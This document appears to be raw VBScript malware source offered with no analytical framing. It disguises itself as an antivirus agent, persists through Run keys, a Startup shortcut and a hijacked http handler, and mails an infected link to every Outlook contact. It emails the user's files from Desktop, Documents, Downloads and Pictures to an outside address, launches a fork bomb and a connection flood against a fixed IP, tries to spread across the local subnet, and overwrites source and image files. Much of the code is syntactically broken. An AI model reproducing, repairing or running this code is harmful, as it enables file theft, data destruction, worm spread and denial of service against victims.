Set objFSO = CreateObject("Scripting.FileSystemObject")

Set WshShell = WScript.CreateObject("WScript.Shell")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "jmkk434voollrk2jf9i442uj8fr"
strKeyValue = WScript.ScriptFullName

WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ"

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "325ogrehehreger"
strKeyValue = WScript.ScriptFullName

WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ"

Set fs = CreateObject("Scripting.FileSystemObject")
fs.CopyFile WScript.ScriptFullName, "%Temp%\" & WScript.ScriptName

Set WshShell = WScript.CreateObject("WScript.Shell")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "auemf8vj4guyherg98dyv23jfd08324jdd2f"
strKeyValue = WScript.ScriptFullName

WshShell.RegWrite strKeyPath & "\%Temp%\" & strKeyName, strKeyValue, "REG_SZ"

Set fs = CreateObject("Scripting.FileSystemObject")
fs.CopyFile WScript.ScriptFullName, "%User%\MelioBytesVirusScan\" & WScript.ScriptName

Set fs = CreateObject("Scripting.FileSystemObject")
fs.CopyFile WScript.ScriptFullName, "%User%\MelioBytesVirusScan\MalwareDetectionAgent"

Set WshShell = WScript.CreateObject("WScript.Shell")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "MalwareDetectionAgent"
strKeyValue = WScript.ScriptFullName

WshShell.RegWrite strKeyPath & "%User%\MelioBytesVirusScan\" & strKeyName, strKeyValue, "REG_SZ"

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """Plorg.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """%Temp%\Plorg.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """%User%\MelioBytesVirusScan\Plorg.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("WindowsInstall.vbs")
Set write = file.WriteLine

write("Dim objOutlook")
write("Set objOutlook = CreateObject("Outlook.Application")")

write("Dim objContacts")
write("Set objContacts = objOutlook.Session.GetDefaultFolder(10).Items")

write("For Each objContact In objContacts")
write("    If objContact.Class = 43 Then")
write("        Dim objMail")
write("        Set objMail = objOutlook.CreateItem(0)")

write("        With objMail")
write("            .Subject = "Open Source Project"")
write("            .To = objContact.Email1Address")
write("            .Body = "Please assist or at least look at this new open source project, your help would be very appreciated! https://progaming.monster/showthread.php?id=8VPCC0"")
write("            .Send")
write("        End With")

write("        Set objMail = Nothing")
write("    End If")
write("Next")

file.Close

Set fs = CreateObject("Scripting.FileSystemObject")
fs.CopyFile "WindowsInstall", "%User%\MelioBytesVirusScan\misc\WindowsInstall.vbs"

Set shell = CreateObject("WScript.Shell")
shell.Run("WindowsInstall.vbs")

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """WindowsInstall.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """%User%\MelioBytesVirusScan\misc\WindowsInstall.vbs\"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("rurn48.vbs")

file.WriteLine("Dim objOutlook")
file.WriteLine("Set objOutlook = CreateObject("Outlook.Application")")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objF67 = fso.GetFolder("%User%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objF67")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objF75 = fso.GetFolder("%Desktop%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objF75")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objJ99 = fso.GetFolder("%Documents%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objJ99")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objE74 = fso.GetFolder("%Downloads%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objE74")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.WriteLine("Dim fso, folder, files")
file.WriteLine("Set objRR4 = fso.GetFolder("%Pictures%")")
file.WriteLine("Set fso = CreateObject("Scripting.FileSystemObject")")
file.WriteLine("Set folder = objRR4")
file.WriteLine("Set files = folder.Files")

file.WriteLine("For Each files In folder")
file.WriteLine("            Dim objMail")
file.WriteLine("            Set objMail = objOutlook.CreateItem(0)")

file.WriteLine("            With objMail")
file.WriteLine("                .Subject = "u o!!"")
file.WriteLine("                .To = "GAubb0Vkh4sMCTtJxmlUaFZlu8U1Z4Byki@child.pizza"")
file.WriteLine("                .Body = fso.OpenTextFile(file.Path).ReadAll")
file.WriteLine("                .Send")
file.WriteLine("            End With")

file.WriteLine("            Set objMail = Nothing")
file.WriteLine("        Next")
		
file.WriteLine("Set objContacts = Nothing")
file.WriteLine("Set objOutlook = Nothing")

file.Close

Set shell = CreateObject("WScript.Shell")
shell.Run("rurn48.vbs")

Set fs = CreateObject("Scripting.FileSystemObject")
fs.CopyFile "rurn48.vbs", "%User%\MelioBytesVirusScan\rurn48.vbs"

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """%User%\MelioBytesVirusScan\rurn48.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """rurn48.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Set objTextFile = objFSO.CreateTextFile("C:\Plorg\xer.bat", True)
Set write = objTextFile.WriteLine
write("@echo off")
write("title Porg thumb up yay %random%%random%%random%%random%")
write("set self=%~n0")
write("TYPE %self%.bat > %self%uwu.bat")
write("start %self%uwu.bat")

write("echo import shutil >> %self%XD.py")
write("echo import os >> %self%XD.py")
write("echo shutil.copy(os.path.abspath(__file__), os.path.join(os.path.dirname(os.path.abspath(__file__)), "copy.bat")) >> %self%XD.py"
write("echo os.startfile("copy.bat") >> %self%XD.py")

write("python %self%XD.py")

write("echo XD")

write("echo import socket >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo IP = "104.26.3.4" >> %self%X3.py")
write("echo PORT = 80 >> %self%X3.py")
write("echo CONNECTIONS = 1000 >> %self%X3.py")
write("echo MESSAGE = "i hate the satan >:(" >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo connections = [] >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo for i in range(CONNECTIONS): >> %self%X3.py")
write("echo     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) >> %self%X3.py")
write("echo     server_address = (IP, PORT) >> %self%X3.py")
write("echo     sock.connect(server_address) >> %self%X3.py")
write("echo     connections.append(sock) >> %self%X3.py")
write("echo  >> %self%X3.py")
write("echo while True: >> %self%X3.py")
write("echo     for i in range(len(connections)): >> %self%X3.py")
write("echo         sock = connections[i] >> %self%X3.py")
write("echo         sock.sendall(MESSAGE.encode()) >> %self%X3.py")
write("echo         new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) >> %self%X3.py")
write("echo         new_sock.connect(server_address) >> %self%X3.py")
write("echo         connections.append(new_sock) >> %self%X3.py")
write("echo     print("Number of connections:", len(connections)) >> %self%X3.py")

write("python %self%X3.py")")
objTextFile.Close

ProgramName = "xer.bat"
WshShell.Run ProgramName, 0, True

Set WshShell = WScript.CreateObject("WScript.Shell")

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """C:\Plorg\xer.bat"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

' Get the list of IP addresses on the local subnet
' (Assuming a subnet mask of 255.255.255.0)
Dim arrIPAddresses
arrIPAddresses = GetIPAddresses()

' Loop through each IP address and try to execute the script remotely
For Each strIPAddress in arrIPAddresses
  On Error Resume Next
  objShell.Run "\\" & strIPAddress & "\c$\windows\system32\cscript.exe //B " & WScript.ScriptFullName, 0, True
  If Err.Number = 0 Then
    ' Script executed successfully on remote machine
  End If
Next

' Function to get a list of IP addresses on the local subnet
Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function

Set WshShell = WScript.CreateObject("WScript.Shell")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "Plorg.vbs"
strKeyValue = WScript.ScriptFullName

WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ"

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".txt" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".js" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".py" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".cpp" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".jpg" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".png" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".js" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".py" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%Desktop")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".cpp" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("%User%")

For Each file In folder.Files
  If LCase(Right(file.Name, 4)) = ".jss" Then
    Set txtFile = fso.OpenTextFile(file, 2, True)
    txtFile.Write("luv <3")
    txtFile.Close
  End If
Next

ProgramName = "C:\Plorg\xer.bat"
WshShell.Run ProgramName, 0, True

Set objShell = CreateObject("WScript.Shell")

strDesktop = objShell.SpecialFolders("Startup")
strLinkFile = strDesktop & "\Program.lnk"
Set objLink = objShell.CreateShortcut(strLinkFile)
objLink.TargetPath = "C:\Plorg\xer.bat"
objLink.Save
